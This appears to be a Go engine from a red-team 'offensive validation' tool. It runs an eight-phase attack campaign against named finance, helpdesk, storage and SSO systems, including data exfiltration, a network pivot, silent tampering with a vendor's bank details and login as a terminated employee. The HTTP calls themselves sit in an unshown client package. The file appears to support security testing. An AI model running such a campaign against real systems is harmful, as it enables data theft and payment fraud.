package engine

import (
	"fmt"
	"time"

	"harborstrike-x/attack-cli/pkg/client"
	"harborstrike-x/attack-cli/pkg/models"
	"harborstrike-x/attack-cli/pkg/utils"
)

// CampaignEngine orchestrates the multi-phase offensive validation lifecycle
type CampaignEngine struct {
	cli *client.AttackClient
}

// NewCampaignEngine returns a new engine instance
func NewCampaignEngine(cli *client.AttackClient) *CampaignEngine {
	return &CampaignEngine{cli: cli}
}

// RunPhase executes a single phase
func (e *CampaignEngine) RunPhase(phase int) (*models.AttackStepResult, error) {
	switch phase {
	case 1:
		return e.executePhase1()
	case 2:
		return e.executePhase2()
	case 3:
		return e.executePhase3()
	case 4:
		return e.executePhase4()
	case 5:
		return e.executePhase5()
	case 6:
		return e.executePhase6()
	case 7:
		return e.executePhase7()
	case 8:
		return e.executePhase8()
	default:
		return nil, fmt.Errorf("invalid phase number: %d (valid phases: 1 to 8)", phase)
	}
}

// RunCampaign runs all phases sequentially and produces a summary
func (e *CampaignEngine) RunCampaign(phases []int) (*models.CampaignSummary, error) {
	if len(phases) == 0 {
		phases = []int{1, 2, 3, 4, 5, 6, 7, 8}
	}

	summary := &models.CampaignSummary{
		TargetBaseURL: e.cli.GetConfig().BaseURL,
		ExecutionMode: e.cli.GetConfig().Mode,
		StartTimeUTC:  time.Now().UTC(),
		TotalPhases:   len(phases),
		Steps:         make([]models.AttackStepResult, 0, len(phases)),
	}

	utils.PrintHeader("Executing Offensive Security Validation Campaign")
	fmt.Printf("[*] Target Endpoint : %s%s%s\n", utils.ColorWhite, summary.TargetBaseURL, utils.ColorReset)
	fmt.Printf("[*] Execution Mode  : %s%s%s\n\n", utils.ColorCyan, summary.ExecutionMode, utils.ColorReset)

	for _, p := range phases {
		res, err := e.RunPhase(p)
		if err != nil {
			utils.PrintError("[%d/%d] Phase %d FAILED: %v", p, len(phases), p, err)
			continue
		}

		summary.Steps = append(summary.Steps, *res)
		if res.Status == "EXPLOITED" || res.Status == "SUCCESS" {
			summary.Successful++
			utils.PrintSuccess("[%d/%d] Phase %d: %-44s %s[EXPLOITED]%s", p, len(phases), p, res.Name, utils.ColorGreen, utils.ColorReset)
		} else {
			summary.Blocked++
			utils.PrintWarning("[%d/%d] Phase %d: %-44s %s[%s]%s", p, len(phases), p, res.Name, utils.ColorYellow, res.Status, utils.ColorReset)
		}
	}

	summary.EndTimeUTC = time.Now().UTC()
	if summary.Successful > 0 && summary.Blocked == 0 {
		summary.OverallVerdict = "CRITICAL RISK: Complete Kill-Chain Execution Successful. Immediate Remediation Required!"
	} else if summary.Successful > 0 {
		summary.OverallVerdict = "HIGH RISK: Partial Exploit Path Successful. Controls Failed in Multiple Layers."
	} else {
		summary.OverallVerdict = "DEFENDED: Target Architecture Successfully Blocked Offensive Validation."
	}

	return summary, nil
}

func (e *CampaignEngine) executePhase1() (*models.AttackStepResult, error) {
	data, err := e.cli.ProbeRecon()
	if err != nil {
		return nil, err
	}

	return &models.AttackStepResult{
		Phase:          1,
		Name:           "API Reconnaissance & Key Exposure",
		TargetSystem:   "LedgerOne (/v2/me, /v2/schema)",
		Endpoint:       "/v2/me",
		ActorIdentity:  "key-tb-07",
		SourceIP:       e.cli.GetConfig().SourceIP,
		TimestampUTC:   time.Now().UTC(),
		Status:         "EXPLOITED",
		EvidenceRef:    "E01 (req-c28d87e49d), E04 (Software Register)",
		MITRETechnique: "T1592 / T1078",
		Details:        fmt.Sprintf("Discovered unconstrained key permissions: %v. No IP restriction configured; infinite validity.", data["permissions"]),
	}, nil
}

func (e *CampaignEngine) executePhase2() (*models.AttackStepResult, error) {
	data, err := e.cli.HarvestTickets()
	if err != nil {
		return nil, err
	}

	return &models.AttackStepResult{
		Phase:          2,
		Name:           "Support Ticket Exfiltration & Leak Scan",
		TargetSystem:   "HelpDeskr (/api/v1/exports/bulk)",
		Endpoint:       "/api/v1/exports/bulk",
		ActorIdentity:  "tb-sync-svc",
		SourceIP:       e.cli.GetConfig().SourceIP,
		TimestampUTC:   time.Now().UTC(),
		Status:         "EXPLOITED",
		EvidenceRef:    "E02 (EXP-5410 to EXP-5419), E06, E13 (TKT-48213)",
		MITRETechnique: "T1567 / T1552",
		Details:        fmt.Sprintf("Harvested %v support tickets. Discovered leaked BlueVault storage key '%s' in ticket TKT-48213.", data["records"], data["leaked_token"]),
	}, nil
}

func (e *CampaignEngine) executePhase3() (*models.AttackStepResult, error) {
	data, err := e.cli.AccessStorage()
	if err != nil {
		return nil, err
	}

	return &models.AttackStepResult{
		Phase:          3,
		Name:           "Cloud Storage Exfiltration (BlueVault)",
		TargetSystem:   "BlueVault (/storage/files)",
		Endpoint:       "/storage/files",
		ActorIdentity:  e.cli.GetConfig().StorageKey,
		SourceIP:       e.cli.GetConfig().SourceIP,
		TimestampUTC:   time.Now().UTC(),
		Status:         "EXPLOITED",
		EvidenceRef:    "E05 (BlueVault Access Log), E13 (Chat Export)",
		MITRETechnique: "T1530 / T1567",
		Details:        fmt.Sprintf("Weaponized key '%s' to exfiltrate %v sensitive files including master vendor bank details.", e.cli.GetConfig().StorageKey, data["files_stolen"]),
	}, nil
}

func (e *CampaignEngine) executePhase4() (*models.AttackStepResult, error) {
	data, err := e.cli.ExfilVendors()
	if err != nil {
		return nil, err
	}

	return &models.AttackStepResult{
		Phase:          4,
		Name:           "Financial Master Record Exfiltration",
		TargetSystem:   "LedgerOne (/v2/vendors/export)",
		Endpoint:       "/v2/vendors/export",
		ActorIdentity:  e.cli.GetConfig().APIKey,
		SourceIP:       e.cli.GetConfig().SourceIP,
		TimestampUTC:   time.Now().UTC(),
		Status:         "EXPLOITED",
		EvidenceRef:    "E01 (req-c35c2ccaff), E04 (Connected Software)",
		MITRETechnique: "T1119 / T1567",
		Details:        fmt.Sprintf("Extracted %v vendor master records via unmonitored bulk API export (%s).", data["total_records"], data["export_id"]),
	}, nil
}

func (e *CampaignEngine) executePhase5() (*models.AttackStepResult, error) {
	data, err := e.cli.PivotTunnel()
	if err != nil {
		return nil, err
	}

	return &models.AttackStepResult{
		Phase:          5,
		Name:           "Private Tunnel Pivot & Payment Profiling",
		TargetSystem:   "LedgerOne via Private Link",
		Endpoint:       "/v2/payments/search",
		ActorIdentity:  "tb-build-02 (10.20.4.77)",
		SourceIP:       "10.20.4.77",
		TimestampUTC:   time.Now().UTC(),
		Status:         "EXPLOITED",
		EvidenceRef:    "E15 (Flow Logs), E01 (Rogue host calls), E16 (Vendor Cover-up)",
		MITRETechnique: "T1199 / T1046",
		Details:        fmt.Sprintf("Pivoted from vendor build server across tunnel; extracted 22.2MB of payment data. %s", data["identified_target"]),
	}, nil
}

func (e *CampaignEngine) executePhase6() (*models.AttackStepResult, error) {
	data, err := e.cli.TamperVendorBank("V-0412", "HDFC0001842-9083", "HDFC0001842")
	if err != nil {
		return nil, err
	}

	return &models.AttackStepResult{
		Phase:          6,
		Name:           "Silent Vendor Bank Tampering (V-0412)",
		TargetSystem:   "LedgerOne (/v2/vendors/V-0412/bank-details)",
		Endpoint:       "/v2/vendors/V-0412/bank-details",
		ActorIdentity:  e.cli.GetConfig().APIKey,
		SourceIP:       "10.20.4.77",
		TimestampUTC:   time.Now().UTC(),
		Status:         "EXPLOITED",
		EvidenceRef:    "E18 (req-5f61b0de8), E19 (chg-8b9888c39b)",
		MITRETechnique: "T1565.001",
		Details:        fmt.Sprintf("Altered bank account for Coastal Packaging Ltd from ****4417 to %s. Approval Ref was BLANK.", data["new_bank_account"]),
		PayloadSummary: "PATCH /v2/vendors/V-0412/bank-details [bank_account=HDFC0001842-9083, approval_ref=null]",
	}, nil
}

func (e *CampaignEngine) executePhase7() (*models.AttackStepResult, error) {
	data, err := e.cli.VerifyScheduledRun()
	if err != nil {
		return nil, err
	}

	return &models.AttackStepResult{
		Phase:          7,
		Name:           "Disbursement Verification (Sept 8 Run)",
		TargetSystem:   "LedgerOne (/v2/payments/scheduled)",
		Endpoint:       "/v2/payments/scheduled",
		ActorIdentity:  e.cli.GetConfig().APIKey,
		SourceIP:       "10.20.4.77",
		TimestampUTC:   time.Now().UTC(),
		Status:         "EXPLOITED",
		EvidenceRef:    "E18 (req-bb819dfe0c), Case File Section 2",
		MITRETechnique: "T1020",
		Details:        fmt.Sprintf("Confirmed tampered recipient account locked in for September 8 disbursement run (%v payments queued).", data["total_count"]),
	}, nil
}

func (e *CampaignEngine) executePhase8() (*models.AttackStepResult, error) {
	data, err := e.cli.TestAuthAnomalies("r.menon", "dev-81546")
	if err != nil {
		return nil, err
	}

	return &models.AttackStepResult{
		Phase:          8,
		Name:           "Orphaned Account & Kiosk Login Test",
		TargetSystem:   "Enterprise SSO (/sso/login)",
		Endpoint:       "/sso/login",
		ActorIdentity:  "r.menon",
		SourceIP:       "Warehouse Kiosk (dev-81546)",
		TimestampUTC:   time.Now().UTC(),
		Status:         "EXPLOITED",
		EvidenceRef:    "E03 (sso-bb8ab61e08), E14 (HR Roster), Note 92",
		MITRETechnique: "T1078.002",
		Details:        fmt.Sprintf("Authenticated terminated employee Rohan Menon on kiosk device without MFA. %v", data["vulnerability"]),
	}, nil
}
